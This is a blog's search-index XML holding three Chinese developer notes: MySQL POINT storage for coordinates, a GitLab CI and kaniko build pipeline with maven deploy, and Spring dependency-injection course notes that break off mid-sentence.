<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>经纬度相关处理</title>
      <link href="/2023/05/23/%E7%BB%8F%E7%BA%AC%E5%BA%A6%E7%9B%B8%E5%85%B3%E5%A4%84%E7%90%86/"/>
      <url>/2023/05/23/%E7%BB%8F%E7%BA%AC%E5%BA%A6%E7%9B%B8%E5%85%B3%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-概述"><a class="header-anchor" href="#1-概述">¶</a>1. 概述</h2><p>在开发中，遇到了需要使用经纬度的场景，一开始我们简单的在数据库以<code>Decimal(2,6)</code>来存储，但后来遇到了需要计算各点的距离，因此考虑重构对经纬度的处理。</p><p>现在使用的方案为，前端给后端传double（六位精度够用了），后端转为jts包下的Point类，存入数据库时也是point数据类型。</p><h2 id="2-jts"><a class="header-anchor" href="#2-jts">¶</a>2. jts</h2><p>JTS Topology Suite（Java Topology Suite）是一个开源的Java软件库，它为欧几里得平面线性几何提供了一个对象模型以及一组基本的几何函数。</p><p>导入库的时候遇到一个小插曲，我把其maven依赖配置写进了<code>dependencyManagement</code>，死活下载不到对应的包，后来才注意到。dependencyManagement仅仅用于统一版本，仍然要在依赖配置下添加相关依赖。</p><h2 id="3-数据库point使用"><a class="header-anchor" href="#3-数据库point使用">¶</a>3. 数据库point使用</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test <span class="keyword">VALUE</span> (POINT(<span class="number">1.123456</span>,<span class="number">2.123456</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test <span class="keyword">VALUE</span> (POINT(<span class="number">11.123456</span>,<span class="number">12.123456</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test <span class="keyword">VALUE</span> (POINT(<span class="number">21.123456</span>,<span class="number">22.123456</span>));</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test <span class="keyword">WHERE</span> ST_X(point)<span class="operator">=</span><span class="number">1.123456</span>;</span><br></pre></td></tr></table></figure><p>插入数据时如上，直接肉眼看point数据没有什么意义，只会显示一个编码。</p><p>我们的任务是检索距离近的，MySQL也提供了便捷的方法<code>SELECT ST_X(point) FROM test ORDER BY ST_Distance_Sphere(point(1,2), point) limit 10;</code></p><p>当然这要求商家量不算特别大，目前通过添加索引的方式尽量提高检索能力。之后可能考虑使用ElasticSearch</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
            <tag> 开发项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流水线部署笔记</title>
      <link href="/2023/05/18/%E6%B5%81%E6%B0%B4%E7%BA%BF%E9%83%A8%E7%BD%B2%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/05/18/%E6%B5%81%E6%B0%B4%E7%BA%BF%E9%83%A8%E7%BD%B2%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1>1. 概述</h1><h2 id="功能需求"><a class="header-anchor" href="#功能需求">¶</a>功能需求</h2><p>目前的流水线的功能比较简单，对于有服务实例的仓库，只需要实现maven 构建、测试、打包镜像。对于私有maven仓库，实现自动mvn deploy</p><h2 id="技术选取"><a class="header-anchor" href="#技术选取">¶</a>技术选取</h2><h3 id="1-kaniko"><a class="header-anchor" href="#1-kaniko">¶</a>1. kaniko</h3><p>使用kaniko来打包镜像，kaniko 是一种在容器或 Kubernetes 集群内从 Dockerfile 构建容器镜像的工具。kaniko 不依赖于 Docker 守护进程，而是完全在用户空间中执行 Dockerfile 中的每个命令。这使得在无法轻松或安全地运行 Docker 守护程序的环境中构建容器镜像成为可能，例如标准的 Kubernetes 集群。</p><p>kaniko是谷歌开发的，墙内获取比较麻烦，此外，命令参数较多，使用繁琐。因此考虑搭建自己的kaniko仓库，自定义kaniko镜像。使得其他仓库流水线可以方便地使用&quot;kaniko&quot;命令即可打包镜像。</p><h3 id="2-gitlab-ci"><a class="header-anchor" href="#2-gitlab-ci">¶</a>2. gitlab-ci</h3><p>我们没有使用jenkins等工具，选择使用了gitlab提供的GitLab CI。GitLab CI 是 GitLab 内置的进行持续集成的工具，只需要在仓库根目录下创建 .gitlab-ci.yml 文件，并配置 GitLab Runner；每次提交的时候，GitLab 将自动识别到 .gitlab-ci.yml 文件，并且使用 Gitlab Runner 执行该脚本。</p><h1>2. 实现</h1><h2 id="gitlab-ci-yml"><a class="header-anchor" href="#gitlab-ci-yml">¶</a>gitlab-ci.yml</h2><p>技术文档参考<a href="https://docs.gitlab.com/ee/ci/yaml/gitlab_ci_yaml.html">The gitlab-ci.yml file | GitLab</a></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">test</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">build</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test_job:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">image:</span></span><br><span class="line">    <span class="comment"># 镜像名</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">docker.nju.edu.cn/maven:3.8.7-eclipse-temurin-8-alpine</span></span><br><span class="line">  <span class="attr">allow_failure:</span> <span class="literal">true</span> <span class="comment"># 测试是否允许失败，一般还是默认false</span></span><br><span class="line">  <span class="attr">script:</span> <span class="string">mvn</span> <span class="string">test</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span></span><br><span class="line">  <span class="attr">image:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">gcr.io/kaniko-project/executor:v1.9.0-debug</span></span><br><span class="line">    <span class="attr">entrypoint:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/kaniko/executor</span></span><br><span class="line">      <span class="string">--context</span> <span class="string">&quot;$&#123;CI_PROJECT_DIR&#125;&quot;</span></span><br><span class="line">      <span class="string">--dockerfile</span> <span class="string">&quot;$&#123;CI_PROJECT_DIR&#125;/Dockerfile&quot;</span></span><br><span class="line">      <span class="string">--destination</span> <span class="string">&quot;$&#123;CI_REGISTRY_IMAGE&#125;:$&#123;CI_COMMIT_TAG&#125;&quot;</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">if:</span> <span class="string">$CI_COMMIT_TAG</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build_job:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span></span><br><span class="line">  <span class="attr">image:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="comment"># 镜像名</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">kaniko</span></span><br></pre></td></tr></table></figure><p>上面的build任务为gitlab文档中的kaniko使用方法，而build_job中的写法则是我们希望达成的。</p><h2 id="自定义kaniko"><a class="header-anchor" href="#自定义kaniko">¶</a>自定义kaniko</h2><p>自己打镜像，即使用Dockerfile COPY一些可执行文件到基础kaniko镜像。</p><p>这里，自己写一个kaniko脚本，封装kaniko的几个必选参数，可以通过环境变量获取一些仓库或者流水线的信息，如：<code>$&#123;PIPELINE_ID&#125;</code>。为了执行它，也拷贝了一个bash（直接从ubuntu拷贝的二进制文件），注意如果文件是通过window上传的，会丢失可执行权限，需要在Dockerfile里面写明chmod等。</p><h2 id="Dockerfile"><a class="header-anchor" href="#Dockerfile">¶</a>Dockerfile</h2><p>kaniko打镜像同样依据Dockerfile，这里给出一个简单的maven项目例子</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> maven:main AS MAVEN_BUILD</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . /build</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /build</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mvn package -Dmaven.test.skip=<span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> --from=MAVEN_BUILD /build/target/*.jar /app/app.jar</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;app.jar&quot;</span>, <span class="string">&quot;-Duser.timezone=Asia/Shanghai&quot;</span>]</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8081</span></span><br></pre></td></tr></table></figure><p>这里不多的值得说的就是设置时区。博客和GPT会看到一种写法：<code>RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/time</code></p><p>这是从宿主机拷贝时间，但可能会不存在这个文件，因此最简单的方法是用java加参数。</p><h2 id="自动maven-deploy私人仓库"><a class="header-anchor" href="#自动maven-deploy私人仓库">¶</a>自动maven deploy私人仓库</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">deploy</span></span><br><span class="line"></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">deploy</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">maven:main</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">mkdir</span> <span class="string">-p</span> <span class="string">/root/.m2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">-ne</span> <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;settings xmlns=&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;\n        xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n        xsi:schemaLocation=&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;&gt;\n    &lt;servers&gt;\n        &lt;server&gt;\n            &lt;id&gt;lx-nju&lt;/id&gt;\n            &lt;username&gt;maven&lt;/username&gt;\n            &lt;password&gt;maven&lt;/password&gt;\n        &lt;/server&gt;\n    &lt;/servers&gt;\n    &lt;mirrors&gt;\n        &lt;mirror&gt;\n            &lt;id&gt;alimaven&lt;/id&gt;\n            &lt;name&gt;aliyun maven&lt;/name&gt;\n            &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;\n            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;\n        &lt;/mirror&gt;\n\n        &lt;mirror&gt;\n            &lt;id&gt;CN&lt;/id&gt;\n            &lt;name&gt;OSChina Central&lt;/name&gt;\n            &lt;url&gt;http://maven.oschina.net/content/groups/public/&lt;/url&gt;\n            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;\n        &lt;/mirror&gt;\n\n        &lt;mirror&gt;\n            &lt;id&gt;nexus&lt;/id&gt;\n            &lt;name&gt;internal nexus repository&lt;/name&gt;\n            &lt;url&gt;http://repo.maven.apache.org/maven2&lt;/url&gt;\n            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;\n        &lt;/mirror&gt;\n\n    &lt;/mirrors&gt;\n&lt;/settings&gt;\n&#x27;</span> <span class="string">&gt;</span> <span class="string">/root/.m2/settings.xml</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">mvn</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><h2 id="Springboot项目pom配置"><a class="header-anchor" href="#Springboot项目pom配置">¶</a>Springboot项目pom配置</h2><p>需要注意配置mainClass，否则会报错<code>no main manifest attribute,in app.jar</code>。解决这个问题无疑需要添加插件。一开始我使用<code>maven-jar-plugin</code>插件如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Build an executable JAR --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">addCasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addclasspath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">classpathPrefix</span>&gt;</span>ib/<span class="tag">&lt;/<span class="name">classpathPrefix</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mainclass</span>&gt;</span>org.lexiang.order.OrderApplication<span class="tag">&lt;/<span class="name">mainclass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但在springboot项目中使用这个插件，报了<code>NoclassDefFoundError</code>的错，经过研究，使用<code>spring-boot-maven-plugin</code>可以解决这个问题。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.boot.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>org.lexiang.order.OrderApplication<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/04/10/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/04/10/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">服务端开发笔记</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2023</span><span class="string">/4/10</span> <span class="number">22</span><span class="string">:53:37</span></span><br><span class="line"><span class="attr">tags:</span> </span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="string">SE</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">CS</span></span><br><span class="line"><span class="attr">description:</span> </span><br><span class="line"><span class="attr">cover:</span> <span class="string">/img/MIT6006.png</span></span><br></pre></td></tr></table></figure><h1>服务端开发笔记</h1><h2 id="建立开发环境"><a class="header-anchor" href="#建立开发环境">¶</a>建立开发环境</h2><h3 id="依赖"><a class="header-anchor" href="#依赖">¶</a>依赖</h3><ul><li><strong>spring-boot-devtools</strong></li><li>spring-boot-starter-web</li><li>spring-boot-starter-thymeleaf</li></ul><h3 id="开发期工具：Spring-Boot-DevTools"><a class="header-anchor" href="#开发期工具：Spring-Boot-DevTools">¶</a>开发期工具：Spring Boot DevTools</h3><blockquote><p>参考《Spring 实战（第 5 版）》1.1.2 节、1.3.5 节。</p></blockquote><ul><li>代码变更后应用会自动重启（需要借助 IDE 的自动编译）</li><li>当面向浏览器的资源（如模板、JavaScript、样式表）等发生变化时，会自动刷新浏览器<ul><li>应用会暴露 LiveReload 端口，日志如：<code>LiveReload server is running on port 35729</code></li><li>需要安装 VSCode 插件 LiveReload （IntelliJ IDEA 要做的配置见下页 ppt）</li><li>需要安装浏览器插件：LiveReload，并打开</li></ul></li><li>自动禁用（页面渲染的）模板缓存</li><li>如果使用 H2 数据库，则内置了 H2 控制台。访问：<a href="http://localhost:8080/h2-consle">http://localhost:8080/h2-consle</a></li></ul><p>强调：该工具<strong>只在运行期使用</strong>，所以依赖包中它的依赖范围是 Runtime，与编译器无关，不会有编译优化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="源代码仓库管理"><a class="header-anchor" href="#源代码仓库管理">¶</a>源代码仓库管理</h3><ul><li>也称为版本控制（version control）系统，常用工具有：GitLab、SVN（Subversion）、Bitbucket 等；</li><li>需纳入版本控制的有：功能代码、测试代码、测试脚本、构建脚本、部署脚本、配置文件等；</li><li>从暂存区（index）提交到本地仓库使用的命令是 <code>git commit</code>。</li></ul><p><img src="https://eaglebear2002.github.io/2023Spring-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20230406211654637.png" alt></p><h2 id="依赖注入"><a class="header-anchor" href="#依赖注入">¶</a>依赖注入</h2><p>依赖注入（Dependency Injection），又叫控制反转（IoC）</p><p>Spring 的两个核心技术：</p><ol><li>DI (Dependency Injection)：保留抽象接口，让组件（Component）依赖于抽象接口，当组件要与其他实际的对象发生依赖关系时，由抽象接口来注入依赖的实际对象</li><li>AOP (Aspect Oriented Programming)：通过预编译方式和运行期间动态代理实现程序功能的统一维护的一种技术。利用 AOP 可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发效率</li></ol><h3 id="Spring-的核心是提供了一个容器（container）"><a class="header-anchor" href="#Spring-的核心是提供了一个容器（container）">¶</a>Spring 的核心是提供了一个容器（container）</h3><p><img src="https://eaglebear2002.github.io/2023Spring-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20230406212109430.png" alt></p><h3 id="Spring-配置方案"><a class="header-anchor" href="#Spring-配置方案">¶</a>**Spring 配置方案</h3><blockquote><p>参考《Spring 实战（第 5 版）》1.1 节。</p></blockquote><h4 id="XML-配置"><a class="header-anchor" href="#XML-配置">¶</a>XML 配置</h4><blockquote><p>参加代码 <code>section2-4</code></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;compactDisc&quot;</span></span><br><span class="line">      <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;soundsystem.BlankDisc&quot;</span></span><br><span class="line">      c:_0=<span class="string">&quot;Sgt. Pepper&#x27;s Lonely Hearts Club Band&quot;</span></span><br><span class="line">      c:_1=<span class="string">&quot;The Beatles&quot;</span>&gt;</span><br><span class="line">    &lt;constructor-arg&gt;</span><br><span class="line">        &lt;list&gt;</span><br><span class="line">            &lt;value&gt;Sgt. Pepper<span class="string">&#x27;s Lonely Hearts Club Band&lt;/value&gt;</span></span><br><span class="line"><span class="string">            &lt;value&gt;With a Little Help from My Friends&lt;/value&gt;</span></span><br><span class="line"><span class="string">            &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt;</span></span><br><span class="line"><span class="string">            &lt;value&gt;Getting Better&lt;/value&gt;</span></span><br><span class="line"><span class="string">            &lt;value&gt;Fixing a Hole&lt;/value&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- ...other tracks omitted for brevity... --&gt;</span></span><br><span class="line"><span class="string">        &lt;/list&gt;</span></span><br><span class="line"><span class="string">    &lt;/constructor-arg&gt;</span></span><br><span class="line"><span class="string">&lt;/bean&gt;</span></span><br></pre></td></tr></table></figure><h4 id="JavaConfig"><a class="header-anchor" href="#JavaConfig">¶</a>JavaConfig</h4><blockquote><p>参加代码 <code>section2-2</code></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** * cdplayer配置 * 配置类的用途就是生成并注入 Bean * * <span class="doctag">@author</span> EagleBear2002 * <span class="doctag">@date</span> 2023/04/04 */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CDPlayerConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CompactDisc <span class="title">compactDisc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SgtPeppers();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**     * cd播放器     * 因为使用了 <span class="doctag">@Configuration</span> 和 <span class="doctag">@Bean</span> 注解，多次调用该方法也不会多次 new     *     * <span class="doctag">@param</span> cd cd     * <span class="doctag">@return</span> &#123;<span class="doctag">@link</span> CDPlayer&#125;     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CDPlayer <span class="title">cdPlayer</span><span class="params">(CompactDisc cd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CDPlayer(cd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="自动化配置"><a class="header-anchor" href="#自动化配置">¶</a>自动化配置</h4><blockquote><p>参加代码 <code>section2-1</code></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span> <span class="comment">// 需要对当前对象实例化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CDPlayer</span> <span class="keyword">implements</span> <span class="title">MediaPlayer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CompactDisc cd;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span> <span class="comment">// 把 cd 注入到当前对象中</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CDPlayer</span><span class="params">(CompactDisc cd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cd = cd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cd.play();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAnnotationApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext ctx = <span class="keyword">new</span> AnnotationConfigApplicationContext(CDPlayerConfig.class);</span><br><span class="line">        MediaPlayer player = ctx.getBean(MediaPlayer.class);</span><br><span class="line"><span class="comment">//        整个运行过程中并没有人为 new 新的 SgtPeppers 对象，但输出了 SgtPeppers 的信息</span></span><br><span class="line">        player.play();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>组件扫描（component scanning）</li><li>自动装配（autowiring）<code>@Autowired</code><ol><li>用在构造器；</li><li>用在属性 <code>Setter</code> 方法；</li><li>用在（私有）属性；</li><li><code>required=false</code></li></ol></li></ol><h3 id="Bean-的作用域"><a class="header-anchor" href="#Bean-的作用域">¶</a>Bean 的作用域</h3><p><code>@Scope</code> 可以与 <code>@Component</code> 和 <code>@Bean</code> 一起使用，指定作用域</p><ul><li><code>Singleton</code>，单例，不使用 <code>@Scope</code> 时默认，在整个应用中，只创建 bean 